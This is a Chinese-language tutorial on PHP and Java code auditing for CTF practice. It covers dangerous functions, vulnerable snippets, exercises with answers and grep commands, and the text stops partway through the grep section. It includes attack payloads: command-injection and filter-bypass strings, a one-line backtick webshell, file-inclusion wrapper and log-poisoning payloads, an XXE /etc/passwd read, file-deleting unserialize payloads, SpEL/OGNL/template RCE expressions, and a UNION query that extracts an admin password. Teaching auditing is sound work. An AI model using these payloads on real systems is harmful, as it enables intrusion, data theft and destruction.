# 代码审计入门：PHP 与 Java

> **这份文件是给你"跟着学"用的。**
> 每个函数都会当场解释「它做什么 / 为什么危险 / 怎么用」,不需要你去查文档。
> 建议顺序:第 1 章 → 第 2 章 → 第 3 章 → 第 4 章(做完练习)→ 第 5 章起。

---

## 怎么用这份文件

| 你的情况 | 从哪开始 |
|---|---|
| 完全看不懂 PHP | 第 1 章(读代码的最小语法) |
| 能看懂但不知道哪危险 | 第 2 章(危险函数逐个讲) |
| 老是被"奇怪的写法"难住 | 第 3 章(PHP 特性) |
| 想先练手 | 第 4 章(实战 + 练习) |
| 要学 Java | 第 5 章起 |

**每章结尾有「审计要点」,是这一章最该记住的一句话。**

---

# 第一部分:PHP

---

## 第 1 章 读代码的最小语法

**目标:看到一段 PHP,能说出"它在干什么"。**

### 1.1 变量:名字前面带 `$`

```php
$name = "abc";       // 字符串
$age  = 18;          // 数字
$isOk = true;        // 布尔
$nothing = null;     // 空
```

**和别的语言一样,只是变量名必须以 `$` 开头。**

审计时注意:**变量名本身没意义,要看它从哪来。**

```php
$name = "abc";              // 写死的,不可控
$name = $_GET['name'];      // 用户可控 ← 危险
```

### 1.2 字符串:单引号 vs 双引号(重要)

```php
$id = 1;

echo 'id is $id';    // 输出:id is $id      ← 单引号不解析变量
echo "id is $id";    // 输出:id is 1        ← 双引号解析变量
```

**审计意义:** 双引号里能插变量,所以 SQL 拼接常这样写:

```php
$sql = "SELECT * FROM users WHERE id = $id";     // ← 变量被插进 SQL
```

**这就是注入的源头。看到双引号里带 `$` 的 SQL,立刻警觉。**

### 1.3 数组

```php
$a = [1, 2, 3];                    // 索引数组
$b = ['name' => 'tom', 'age' => 18];   // 关联数组(键值对)

echo $a[0];          // 1
echo $b['name'];     // tom
```

**超全局变量其实都是数组:**

```php
$_GET['id']          // URL 参数 ?id=1
$_POST['cmd']        // 表单字段
```

### 1.4 超全局变量:用户输入的四种来源 ⭐

**这是 PHP 审计的第一课 —— 找到"用户能控制的东西"。**

| 变量 | 数据来源 | 例子 |
|---|---|---|
| **`$_GET`** | URL 问号后的参数 | `?id=1&name=tom` |
| **`$_POST`** | POST 请求体(表单) | 表单提交、AJAX |
| **`$_COOKIE`** | 浏览器的 Cookie | `Cookie: role=admin` |
| **`$_REQUEST`** | 上面三种的合集 | 不确定来源时用 |

**还有两个特殊情况:**

| 变量 | 数据来源 | 说明 |
|---|---|---|
| **`$_FILES`** | 上传的文件 | 文件名、临时路径、内容 |
| **`$_SERVER`** | 服务器信息 | `HTTP_USER_AGENT`、`HTTP_HOST` 都是**用户可控**的! |

**审计口诀:**

> **凡是 `$_` 开头且后面不是 `SESSION`,基本都可控。**

**反例(不可控):**

```php
$_SESSION['user']    // 服务端存的,用户改不了
```

### 1.5 判断与循环

```php
// 判断
if ($a == $b) { }        // 弱比较(值相等即可)
if ($a === $b) { }       // 强比较(值和类型都相等)

// 三元
$c = $a ? 'yes' : 'no';

// 循环
foreach ($arr as $item) { }
while ($i < 10) { }
```

**审计意义:`==` 和 `===` 的区别是 PHP 弱类型的核心漏洞来源(见第 3 章)。**

### 1.6 函数

```php
function add($a, $b) {
    return $a + $b;
}

add(1, 2);    // 调用
```

**审计时:** 函数本身不可怕,**可怕的是函数内部做了什么**。

```php
function safe($x) {
    return intval($x);          // 安全
}

function dangerous($x) {
    system($x);                 // 危险 ← 要看函数体
}
```

### 1.7 包含文件:include

```php
include 'header.php';           // 引入另一个文件
require 'config.php';           // 同上,但失败时行为不同
include_once 'a.php';           // 只引一次
```

**为什么危险:** include 会把目标文件**当 PHP 代码执行**。

```php
$file = $_GET['page'];
include $file;                  // ?page=../../etc/passwd
```

**这是「文件包含漏洞」的源头**(第 2.3 节详讲)。

### 1.8 类与对象(为反序列化准备)

```php
class User {
    public $name;                       // 属性

    function __construct() {            // 构造函数:创建对象时自动执行
        echo "created";
    }

    function __destruct() {             // 析构函数:对象被销毁时自动执行
        echo "destroyed";
    }

    function greet() {                  // 普通方法
        return "hi";
    }
}

$u = new User();                        // 创建对象
$u->name = "tom";                       // 访问属性
$u->greet();                            // 调用方法
```

**关键概念:`__construct` 和 `__destruct` 是「魔术方法」,会在特定时机自动执行。**

**审计意义:** 反序列化漏洞就是**控制对象的属性,让魔术方法执行危险操作**(第 2.6 节详讲)。

### 📌 第 1 章审计要点

> **审计第一步永远是找输入点:`$_GET` / `$_POST` / `$_COOKIE` / `$_FILES` / `$_SERVER`。**
> 找到输入点后,顺着变量往下追,看它最终流到了哪个函数。

---

## 第 2 章 危险函数逐个讲

**这章是核心。每种漏洞对应一组函数,看到就要警觉。**

---

### 2.1 命令执行族

**共同点:把字符串当操作系统命令执行。**

#### `system($cmd)`

```php
system("whoami");
```

**做什么:** 执行命令,并**直接把输出打印到页面**。

**危险写法:**

```php
$cmd = $_GET['cmd'];
system($cmd);           // ?cmd=cat /flag
```

**审计要点:** 看参数是不是来自超全局变量,中间有没有 `escapeshellarg()`。

---

#### `exec($cmd)`

```php
$out = exec("whoami");
```

**做什么:** 执行命令,**返回值是最后一行**,不自动输出。

**危险写法:**

```php
$ip = $_GET['ip'];
exec("ping -c 1 " . $ip);       // ?ip=127.0.0.1;cat /flag
```

**注意:** 虽然不直接输出,但 `;` 后面的命令照样执行 —— **可以写文件、反弹 shell**。

---

#### `shell_exec($cmd)`

```php
$out = shell_exec("ls");
echo $out;
```

**做什么:** 执行命令,**返回全部输出**(字符串),不自动打印。

**危险写法:**

```php
echo shell_exec("cat " . $_GET['file']);
```

---

#### `passthru($cmd)`

```php
passthru("ls -la");
```

**做什么:** 执行命令并输出**原始二进制数据**(适合处理二进制输出)。

**危险写法和上面一样,同样可注入。**

---

#### `popen($cmd, $mode)` / `proc_open()`

```php
$handle = popen("ls", "r");
```

**做什么:** 打开一个进程管道,更底层。

**审计意义:** 少见,但同样可注入。

---

#### 反引号 `` ` ``

```php
$out = `whoami`;
```

**做什么:** **等价于 `shell_exec()`**,只是写法更短。

**危险写法(CTF 高频):**

```php
<?=`$_GET[0]`;?>        // 16 字节的 webshell
```

**审计要点:** 反引号很容易被忽略(看起来像引号),**看到 `` ` ` `` 就要想到命令执行**。

---

#### 📌 命令执行族的审计要点

```
① 参数是否来自 $_GET/$_POST/$_COOKIE/$_FILES['name']/$_SERVER['HTTP_*']
② 有没有 escapeshellarg() / escapeshellcmd()
③ 如果有过滤,看过滤了什么(空格?分号?关键词?)
```

**常见绕过:** `;` `|` `||` `&&` `&` `` ` `` `$()` `${IFS}` 空格替代。

---

### 2.2 代码执行族

**共同点:把字符串当 PHP 代码执行。**

#### `eval($code)`

```php
eval("echo 1+1;");
```

**做什么:** 把字符串当 PHP 代码**执行**。

**危险写法:**

```php
eval($_POST['cmd']);        // POST cmd=system('id');
```

**审计要点:** `eval` 几乎不可能安全,**只要参数可控就是严重漏洞**。

---

#### `assert($code)`

```php
assert("phpinfo()");
```

**做什么:** **PHP 7 及以前**,字符串参数会被当代码执行(PHP 8 不再支持)。

**审计意义:** 老代码里 `assert($_GET['x'])` 等于 `eval`。

---

#### `create_function($args, $code)`

```php
$f = create_function('', 'echo "hi";');
$f();
```

**做什么:** 动态创建一个匿名函数,**第二个参数是函数体代码**。

**危险写法:**

```php
$code = $_GET['code'];
create_function('', $code);         // 直接执行
```

**审计意义:** 只要第二个参数可控 = 代码执行。**PHP 8 已移除该函数。**

---

#### `preg_replace($pattern, $replacement, $subject)` + `/e`

```php
preg_replace('/abc/e', 'system("id")', $input);
```

**做什么:** 正则替换。**带 `/e` 修饰符时,替换内容会被当 PHP 代码执行**。

**审计要点:** 看到 `preg_replace` 就去数**第一个参数的最后有没有 `e`**。PHP 7 已废弃。

---

#### `call_user_func($func, ...$args)`

```php
call_user_func('system', 'id');
call_user_func($_GET['f'], $_GET['a']);     // 危险:任意函数
```

**做什么:** **调用指定的函数**,函数名可以是变量。

**危险写法:**

```php
$f = $_GET['f'];
$f('id');                       // 变量函数,等价写法
call_user_func($f, 'id');       // 同上
```

**审计要点:** 函数名可控 = 可以调用任意函数(包括 `system`)。

---

#### `array_map($callback, $array)` / `usort` / `uasort` / `array_filter`

```php
$arr = [1,2,3];
array_map('system', $arr);          // 对每个元素调用 system
usort($arr, $_GET['cb']);           // 用可控的函数名排序
```

**做什么:** 这类函数接受**回调函数**(函数名),内部会调用它。

**审计要点:** **回调参数可控 = 可以调用任意函数。**

---

#### `ob_start($callback)`

```php
ob_start($_GET['cb']);
```

**做什么:** 开启输出缓冲,回调函数会在输出时执行。

**审计意义:** 少见但同样能代码执行。

---

#### 📌 代码执行族的审计要点

```
① 找 eval / assert / create_function / preg_replace(/e)
② 找"函数名可控"的地方:变量函数 $f() / call_user_func / 回调参数
③ 只要能把任意函数名+参数传进去 = 代码执行
```

---

### 2.3 文件包含:include / require

```php
include $file;
require $file;
include_once $file;
require_once $file;
```

**做什么:** 把指定文件的内容**当 PHP 代码执行**。

**危险写法:**

```php
$page = $_GET['page'];
include $page . '.php';             // ?page=../../../../etc/passwd%00
```

**为什么危害大:** 不只读文件,**能包含远程文件**(如果 `allow_url_include=On`)或**配合伪协议**。

**四种利用方式:**

| 方式 | payload | 前提 |
|---|---|---|
| **读源码** | `php://filter/convert.base64-encode/resource=index.php` | 无需特殊配置 |
| **执行 POST 内容** | `php://input` + POST body 写 `<?php system('id');?>` | `allow_url_include=On` |
| **直接构造** | `data://text/plain,<?php system('id');?>` | `allow_url_include=On` |
| **远程包含** | `http://攻击者/x.txt` | `allow_url_include=On` |

#### 📌 文件包含的审计要点

```
① 参数可控 + include/require → 文件包含
② 看有没有白名单(通常是数组 in_array)
③ 没有白名单 → 试伪协议
```

**伪协议详解见第 3.3 节。**

---

### 2.4 文件操作族

| 函数 | 做什么 | 危险点 |
|---|---|---|
| `file_get_contents($f)` | **读文件**返回内容 | 参数可控 → 任意文件读取 / SSRF |
| `file_put_contents($f, $d)` | **写文件** | 可控路径+内容 → 写 webshell |
| `fopen($f, $mode)` | 打开文件句柄 | 同上 |
| `fwrite($h, $data)` | 写入内容 | 配合 fopen 写 shell |
| `readfile($f)` | 读文件并**直接输出** | 任意读 |
| `copy($src, $dst)` | 复制文件 | 可控目标 → 覆盖文件 |
| `rename($a, $b)` | 重命名 | 可控目标 → 移动文件 |
| `unlink($f)` | **删除文件** | 可控路径 → 删任意文件 |
| `move_uploaded_file($tmp, $dst)` | 移动上传的临时文件 | 可控目标 → 上传 getshell |

**典型危险代码:**

```php
$file = $_GET['file'];
echo file_get_contents($file);       // ?file=../../../../etc/passwd
```

```php
$content = $_POST['content'];
file_put_contents("uploads/" . $_GET['name'], $content);   // 写 webshell
```

#### 📌 文件操作的审计要点

```
① 路径参数可控 → 路径穿越 / 任意读写
② 内容参数可控 + 路径可写 → 写 webshell
③ 注意过滤:../ 有没有被替换?路径有没有 basename()?
```

---

### 2.5 SQL 执行族

| 函数 | 说明 |
|---|---|
| `mysql_query($sql)` | 老扩展(**PHP 7 已移除**) |
| `mysqli_query($conn, $sql)` | 常用 |
| `mysqli_multi_query()` | **支持一次执行多条**,注入危害更大 |
| `PDO::query($sql)` | PDO 的直接查询 |
| `PDO::exec($sql)` | 执行不返回结果集的语句 |

**危险写法(拼接):**

```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
mysqli_query($conn, $sql);           // ?id=1 OR 1=1
```

**安全写法(参数化):**

```php
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);         // ← 参数绑定,安全
$stmt->execute();
```

#### 📌 SQL 注入的审计要点

```
① 找 mysql_query / mysqli_query / PDO::query
② 看 SQL 语句里有没有拼接变量(点号 . 或双引号内 $变量)
③ 有 prepare + bind_param = 安全
④ 直接拼接 = 有注入
```

**SQL 注入的利用方法见你的 `E:\dsh\sql\` 目录。**

---

### 2.6 反序列化:unserialize

```php
$data = $_GET['data'];
$obj = unserialize($data);           // 危险:用户可控的序列化数据
```

**做什么:** 把字符串还原成 PHP 对象。

**为什么会漏洞:** 还原对象时会**触发魔术方法**,如果魔术方法里有危险操作(删文件、写文件、执行命令),就能利用。

**魔术方法与触发时机:**

| 魔术方法 | 什么时候自动执行 |
|---|---|
| `__construct()` | 创建对象时 |
| **`__destruct()`** | **对象被销毁时**(最常见) |
| **`__wakeup()`** | **unserialize 时**(第二常见) |
| `__toString()` | 对象被当字符串用时 |
| `__invoke()` | 对象被当函数调用时 |
| `__call()` | 调用不存在的方法时 |
| `__get()` / `__set()` | 访问不存在/不可见属性时 |

**漏洞代码示例:**

```php
class File {
    public $path;
    function __destruct() {
        unlink($this->path);         // 对象销毁时删文件
    }
}

$data = $_GET['data'];
unserialize($data);                  // 控制 $path 就能删任意文件
```

**构造 payload:**

```php
class File { public $path = '/var/www/html/index.php'; }
echo serialize(new File());
// 输出:O:4:"File":1:{s:4:"path";s:25:"/var/www/html/index.php";}
```

**把这个字符串传给 `?data=` 就能删文件。**

#### 📌 反序列化的审计要点

```
① 找 unserialize(参数可控)
② 找类里的魔术方法(__destruct / __wakeup / __toString)
③ 看魔术方法里有没有危险操作
④ 高级题需要构造"POP 链"(多个对象串联)
```

---

### 2.7 SSRF 相关

| 函数 | 说明 |
|---|---|
| `curl_exec($ch)` | 执行 cURL 请求,URL 可控 → SSRF |
| `file_get_contents($url)` | **参数是 URL 时**也能发起请求 |
| `fsockopen($host, $port)` | 打开 socket 连接 |
| `stream_socket_client()` | 同上 |

**危险写法:**

```php
$url = $_GET['url'];
$content = file_get_contents($url);      // ?url=http://127.0.0.1/admin
```

#### 📌 SSRF 的审计要点

```
① 参数可控 + 网络函数 → SSRF
② 看有没有协议限制(http/https 白名单)
③ 看有没有内网 IP 黑名单
```

---

### 2.8 XXE 相关

| 函数 | 说明 |
|---|---|
| `simplexml_load_string($xml)` | 解析 XML 字符串 |
| `simplexml_load_file()` | 解析 XML 文件 |
| `DOMDocument::loadXML()` | 同上 |
| `SimpleXMLElement` | 构造时解析 |

**危险写法:**

```php
$xml = $_POST['xml'];
$data = simplexml_load_string($xml);     // 默认解析外部实体 → XXE
```

**利用 payload:**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

---

### 2.9 变量覆盖

| 函数 / 语法 | 说明 |
|---|---|
| `extract($arr)` | 把数组的键当成变量名 |
| `parse_str($str, $out)` | 把查询字符串解析成变量 |
| `$$var` | 可变变量 |
| `${'a'.'b'}` | 动态变量名 |

**危险写法:**

```php
extract($_GET);          // ?is_admin=1 → $is_admin = 1
if ($is_admin) { ... }
```

**审计要点:** 看到 `extract($_GET/$_POST)` = 可以覆盖任意变量。

---

## 第 3 章 PHP 特性(CTF 高频)

### 3.1 弱比较:== 的坑

```php
"abc" == 0        // true(非数字字符串转成 0)← PHP 7 及以前
"1abc" == 1       // true
"0e123" == "0e456"  // true(都被当 0)
null == false     // true
```

**强比较 `===` 要求类型也相同,不踩这些坑。**

**常见绕过:**

```php
// 条件:if ($md5 != $md5_2)  ->  用两个 MD5 以 0e 开头的字符串
"QNKCDZO"          // MD5: 0e830400451993494058024219903391
"240610708"        // MD5: 0e462097431906509019562988736854
// 两者弱比较相等

// 条件:if ($a === $b)  ->  用真实碰撞字符串对
// TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
// TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
```

### 3.2 变量函数

```php
$func = "system";
$func("id");             // 等价于 system("id")
```

**审计要点:** 变量后面直接跟括号 `$x(...)` = 调用变量内容作为函数。

### 3.3 伪协议

| 协议 | 用途 | 前提 |
|---|---|---|
| `php://filter` | **读源码**(base64 编码后输出) | 无需配置 |
| `php://input` | 读取 POST 原始 body | 文件包含时可执行 |
| `data://` | 直接构造内容 | `allow_url_include=On` |
| `phar://` | 触发反序列化 | 有文件操作函数 |
| `file://` | 读本地文件 | — |

**最常用:读源码**

```
php://filter/convert.base64-encode/resource=index.php
```

**审计要点:** 有任何文件读取/包含,先试 `php://filter`。

### 3.4 魔术方法补充

第 2.6 节已经列了魔术方法表,这里补充**触发条件**:

| 魔术方法 | 怎么触发 |
|---|---|
| `__destruct()` | 脚本结束 / 对象被 unset |
| `__wakeup()` | `unserialize()` 时 |
| `__toString()` | `echo $obj` / 字符串拼接 |
| `__invoke()` | `$obj()` |
| `__get($name)` | `$obj->不存在的属性` |
| `__set($name, $v)` | `$obj->不存在的属性 = 值` |
| `__call($name, $args)` | `$obj->不存在的方法()` |

---

## 第 4 章 完整审计实战

### 4.1 例 1:最经典的 RCE

```php
<?php
$cmd = $_GET['cmd'];
system($cmd);
```

**逐行分析:**

| 行 | 代码 | 分析 |
|---|---|---|
| 2 | `$cmd = $_GET['cmd'];` | **输入源**:URL 参数 `cmd` |
| 3 | `system($cmd);` | **sink**:命令执行,参数直接来自输入 |

**结论:** 存在命令注入。

**利用:** `?cmd=cat /flag`

---

### 4.2 例 2:有过滤,但能绕

```php
<?php
$cmd = $_GET['cmd'];
if (strpos($cmd, 'flag') !== false) {
    die('no flag');
}
system($cmd);
```

**逐行分析:**

| 行 | 代码 | 分析 |
|---|---|---|
| 2 | `$cmd = $_GET['cmd'];` | 输入源 |
| 3–5 | `strpos($cmd,'flag')` | **过滤**:如果包含 `flag` 就退出 |
| 6 | `system($cmd);` | sink |

**过滤的漏洞:** 只看是否包含字面量 `flag`。

**绕过:**

```
?cmd=cat /f*              ← 通配符
?cmd=c'a't /flag          ← 引号拆分
?cmd=nl /flag             ← 换命令
```

**审计要点:** 过滤是**黑名单**还是**白名单**?黑名单几乎总能绕。

---

### 4.3 例 3:文件包含 + 伪协议

```php
<?php
$page = $_GET['page'] ?? 'home';
include "pages/" . $page . ".php";
```

**分析:**

| 行 | 代码 | 分析 |
|---|---|---|
| 2 | `$_GET['page']` | 输入源,默认值 `home` |
| 3 | `include "pages/" . $page . ".php"` | sink:**路径拼接 + 包含** |

**利用链:**

```
① 读源码:?page=php://filter/convert.base64-encode/resource=index
           (注意:拼了 .php 后缀,可以用 php://filter 的特性穿越)
② 如果 allow_url_include=On:?page=data://text/plain,<?php system('id');?>
③ 日志包含:先访问一个页面把 payload 写进 access.log,
           然后 ?page=../../../../var/log/apache2/access.log
```

**审计要点:** 看到 `include` + 路径拼接,立刻想到**伪协议**和**路径穿越**。

---

### 4.4 练习(先自己看,再看答案)

#### 练习 1

```php
<?php
$file = $_GET['f'];
$content = file_get_contents($file);
echo $content;
```

<details>
<summary>答案</summary>

**漏洞:** 任意文件读取。

- 输入源:`$_GET['f']`
- sink:`file_get_contents()` 直接读文件并输出
- 无任何过滤

**利用:** `?f=../../../../etc/passwd`

**进阶:** 如果 `allow_url_fopen=On`,还能 SSRF:`?f=http://127.0.0.1/admin`

</details>

---

#### 练习 2

```php
<?php
class Delete {
    public $target;
    public function __destruct() {
        unlink($this->target);
    }
}
$data = $_COOKIE['data'];
unserialize($data);
```

<details>
<summary>答案</summary>

**漏洞:** 反序列化导致任意文件删除。

- 输入源:`$_COOKIE['data']`
- sink:`unserialize()` → 触发 `__destruct()` → `unlink()`

**构造 payload:**

```php
class Delete { public $target = '/var/www/html/index.php'; }
echo urlencode(serialize(new Delete()));
```

**注意对象名要和题目里的类名完全一致(`Delete`)。**

</details>

---

#### 练习 3

```php
<?php
$id = $_POST['id'];
$sql = "SELECT * FROM users WHERE id = '" . $id . "'";
$result = mysqli_query($conn, $sql);
$row = mysqli_fetch_assoc($result);
if ($row) { echo "欢迎回来"; }
```

<details>
<summary>答案</summary>

**漏洞:** 字符串型 SQL 注入(盲注)。

- 输入源:`$_POST['id']`
- sink:SQL 拼接
- **页面只输出"欢迎回来",没有数据回显 → 盲注**

**利用:**

```
id = 1' AND '1'='1        → 显示"欢迎回来"
id = 1' AND '1'='2        → 不显示
```

然后是标准的布尔盲注(见 `E:\dsh\sql\` 目录)。

</details>

---

### 📌 第一部分审计要点总结

```
① 找输入点:$_GET / $_POST / $_COOKIE / $_FILES / $_SERVER
② 找 sink:第 2 章的六族危险函数
③ 追变量:从输入点到 sink 中间经过什么
④ 找过滤:黑名单几乎总能绕,白名单才安全
```

---

# 第二部分:Java

---

## 第 5 章 读代码的最小语法

### 5.1 和 PHP 最大的区别:变量必须声明类型

```java
String name = "tom";            // 字符串
int age = 18;                   // 整数
boolean ok = true;              // 布尔
List<String> list = new ArrayList<>();   // 列表
```

**读 Java 的诀窍:类型能告诉你这个变量能干什么。**

```java
String sql = "SELECT ...";      // 字符串 → 可能拼进 SQL
Runtime rt = Runtime.getRuntime();   // ← 这个类型就是命令执行入口
```

### 5.2 import 是线索 ⭐

**Java 文件开头的一堆 `import`,直接暴露了这个文件在用什么。**

```java
import java.lang.Runtime;                            // → 可能执行命令
import java.io.ObjectInputStream;                    // → 可能有反序列化
import org.springframework.web.bind.annotation.*;    // → 是 Spring 项目
import java.sql.Statement;                           // → 可能有 SQL 注入
import javax.xml.parsers.DocumentBuilderFactory;     // → 可能有 XXE
```

**审计时先看 import,能快速定位这个文件值不值得细读。**

### 5.3 Spring 注解:入口在哪

**CTF 里的 Java 题 80% 是 Spring Boot。**

```java
@RestController                    // ① 这是个 Web 入口类
@RequestMapping("/api")            // ② 统一路径前缀
public class UserController {

    @GetMapping("/get")            // ③ 处理 GET /api/get
    public String get(@RequestParam String id) {    // ④ 参数来自 URL
        return service.query(id);
    }
}
```

| 注解 | 含义 |
|---|---|
| `@Controller` / `@RestController` | **入口类** |
| `@RequestMapping("/x")` | 路由前缀 |
| `@GetMapping` / `@PostMapping` | 具体路由 |
| **`@RequestParam`** | 参数来自 **URL 参数** |
| **`@PathVariable`** | 参数来自 **URL 路径** |
| **`@RequestBody`** | 参数来自 **请求体** |
| `@Autowired` | 依赖注入(说明这是框架管理的类) |

**审计口诀:**

> **带 `@RequestParam` / `@PathVariable` / `@RequestBody` 的参数 = 用户可控。**

### 5.4 类和对象

```java
public class User {
    private String name;                 // 属性

    public User(String name) {           // 构造函数
        this.name = name;
    }

    public String getName() {            // 方法
        return name;
    }
}
```

**调用:**

```java
User u = new User("tom");
u.getName();
```

**写 `user.getName()` 而不是 `$user->getName()` —— Java 用点。**

---

## 第 6 章 Java 危险点

### 6.1 命令执行

#### `Runtime.getRuntime().exec()`

```java
Runtime.getRuntime().exec("whoami");
```

**做什么:** 执行系统命令。**Java 里最经典的命令执行。**

**危险写法:**

```java
@GetMapping("/ping")
public String ping(@RequestParam String ip) throws Exception {
    Runtime.getRuntime().exec("ping -c 1 " + ip);    // ?ip=127.0.0.1;id
    return "ok";
}
```

**注意:`exec()` 不会自动调用 shell,所以 `;` 不一定生效。** 常见绕过:

```
?ip=127.0.0.1 -c 1 && id       ← 用 && 或 ||
?ip=127.0.0.1;id                ← 某些环境直接支持
```

#### `ProcessBuilder`

```java
new ProcessBuilder("sh", "-c", "whoami").start();
```

**做什么:** 更现代的命令执行方式。**如果参数可控,同样能注入。**

**审计要点:**

```
① 找 Runtime.getRuntime().exec / ProcessBuilder
② 参数是否来自 @RequestParam 等可控来源
③ 有没有白名单校验命令
```

---

### 6.2 表达式注入(Java 特有)

**这是 Java 独有的漏洞类型,危害极高。**

#### SpEL(Spring Expression Language)

```java
SpelExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(userInput);    // ← 危险
exp.getValue();
```

**做什么:** 解析并执行 Spring 表达式语言。

**利用 payload:**

```java
T(java.lang.Runtime).getRuntime().exec("id")
```

**审计要点:** `parseExpression` 的参数可控 = RCE。

#### OGNL(Struts2 用的表达式)

```java
Ognl.getValue(userInput, context, root);    // ← 危险
```

**利用 payload 类似:**

```
%{#a=(new java.lang.ProcessBuilder("id")).start()}
```

**审计要点:** `Ognl.getValue` / `Ognl.parseExpression` 参数可控。

#### EL(表达式语言,JSP 用)

```java
ELProcessor el = new ELProcessor();
el.eval(userInput);        // ← 危险
```

---

### 6.3 反序列化(Java 的重灾区)

#### `ObjectInputStream.readObject()`

```java
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject();          // ← 危险
```

**做什么:** 从字节流还原对象。

**为什么比 PHP 危险:** Java 的类库庞大,**只要能触发一条"gadget chain"(利用链),就能 RCE**。

**著名的利用链:**

| 组件 | 漏洞 |
|---|---|
| **CommonsCollections** | `InvokerTransformer` 链 |
| **Shiro** | `rememberMe` Cookie 反序列化 |
| **Fastjson** | `autoType` 绕过 |
| **WebLogic / WebSphere** | 一堆原生 gadget |

**审计要点:**

```
① 找 ObjectInputStream / readObject
② 找 JSON 解析:JSON.parse(userInput) (Fastjson)
③ 找 XMLDecoder
④ 看用了什么第三方库(决定有没有 gadget)
```

#### `XMLDecoder`

```java
XMLDecoder decoder = new XMLDecoder(inputStream);
Object obj = decoder.readObject();      // ← 直接构造对象
```

**利用:** 在 XML 里写 `<object class="java.lang.Runtime">` 直接执行命令。

---

### 6.4 SQL 注入:两种写法一个判断

#### 危险:`Statement` + 拼接

```java
Statement stmt = conn.createStatement();
String sql = "SELECT * FROM users WHERE id = " + id;
ResultSet rs = stmt.executeQuery(sql);          // ← 注入
```

#### 安全:`PreparedStatement` + 参数绑定

```java
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE id = ?");
ps.setInt(1, id);                                // ← 安全
ResultSet rs = ps.executeQuery();
```

**判断方法:**

```
看到 Statement.executeXxx(拼接的字符串)  →  有注入
看到 PreparedStatement + setXxx()        →  安全
```

#### MyBatis:看 `${}` 还是 `#{}`

```xml
<select id="get">
    SELECT * FROM users WHERE name = '${name}'   <!-- 拼接,危险 -->
</select>

<select id="get">
    SELECT * FROM users WHERE name = '#{name}'   <!-- 参数化,安全 -->
</select>
```

**记忆:`$` 是拼接(危险),`#` 是预编译(安全)。**

---

### 6.5 SSRF

```java
URL url = new URL(userInput);
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.getInputStream();
```

**危险写法:**

```java
@GetMapping("/fetch")
public String fetch(@RequestParam String url) throws Exception {
    return IOUtils.toString(new URL(url).openStream());   // ?url=http://127.0.0.1
}
```

**常见 SSRF 入口:**

| 类 | 方法 |
|---|---|
| `URL` | `openConnection()` / `openStream()` |
| `HttpClient` | `execute()` |
| `RestTemplate` | `getForObject()` |
| `OkHttpClient` | `newCall()` |

---

### 6.6 XXE

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(inputStream);        // 默认解析外部实体 → XXE
```

**安全写法(禁用外部实体):**

```java
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

**审计要点:** 看到 XML 解析且**没有设置 feature**,就是 XXE。

---

### 6.7 模板注入

```java
// Thymeleaf
String template = userInput;
templateEngine.process(template, context);      // ← 危险

// Freemarker
new Template("x", new StringReader(userInput), cfg);
```

**利用 payload(Thymeleaf):**

```html
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
```

---

## 第 7 章 Java 审计实战

### 例:一个典型的 Spring 漏洞

```java
@RestController
@RequestMapping("/api")
public class DemoController {

    @GetMapping("/exec")
    public String exec(@RequestParam String cmd) throws Exception {
        Runtime.getRuntime().exec(cmd);
        return "ok";
    }
}
```

**逐行分析:**

| 行 | 代码 | 分析 |
|---|---|---|
| 1 | `@RestController` | Spring 入口类 |
| 2 | `@RequestMapping("/api")` | 路径前缀 |
| 5 | `@GetMapping("/exec")` | 完整路径:`/api/exec` |
| 6 | `@RequestParam String cmd` | **参数可控** |
| 7 | `Runtime.getRuntime().exec(cmd)` | **命令执行 sink** |

**结论:** 直接 RCE。

**利用:** `GET /api/exec?cmd=id`

---

### 练习

```java
@PostMapping("/query")
public String query(@RequestParam String name) throws Exception {
    String sql = "SELECT * FROM users WHERE name = '" + name + "'";
    Statement stmt = connection.createStatement();
    ResultSet rs = stmt.executeQuery(sql);
    return rs.getString("email");
}
```

<details>
<summary>答案</summary>

**漏洞:** 字符串型 SQL 注入(可回显)。

- 输入:@RequestParam `name`
- sink:`Statement.executeQuery` 拼接
- 回显:返回 `email` 字段 → **可以 UNION 注入**

**利用:**

```
name = ' UNION SELECT password FROM users WHERE username='admin'--
```

**判断依据:** 用了 `Statement` 且字符串拼接 = 一定有注入。

</details>

---

# 第三部分:方法论

---

## 第 8 章 sink 驱动的审计流程

**不要从头读到尾。按这个顺序:**

```
① 列文件        找入口文件(Controller / index.php / 路由文件)
       ↓
② grep 危险函数  第 2 / 6 章的清单
       ↓
③ 定位 sink     某个函数调用了危险函数
       ↓
④ 往上追变量     这个参数从哪来?
       ↓
⑤ 判断可控性     来自 $_GET / @RequestParam → 可控
       ↓
⑥ 找过滤         中间有没有 intval / 白名单 / 转义
       ↓
⑦ 得出漏洞 + 构造 payload
```

**例:**

```php
$id = $_GET['id'];              // ⑤ 可控
$id = intval($id);              // ⑥ 有过滤(intval 转成整数)——安全
$sql = "SELECT * FROM t WHERE id=$id";   // ③ sink
```

**对比:**

```php
$name = $_GET['name'];          // ⑤ 可控
$sql = "SELECT * FROM t WHERE name='$name'";   // ⑥ 无过滤 → 有注入
```

---

## 第 9 章 grep 速查表

**拿到一堆源码,先跑这些命令。**

### PHP

```powershell
# 输入点
grep -rn "\$_GET\|\$_POST\|\$_REQUEST\|\$_COOKIE\|\$_FILES\|\$_SERVER" .

# 命令执行
grep -rn "system\|exec\|shell_exec\|passthru\|popen\|proc_open" .

# 代码执行
grep -rn "eval\|assert\|create_function\|preg_replace\|call_user_func\|array_map\|usort" .

# 文件包含
grep -rn "include\|require" .

# 文件操作
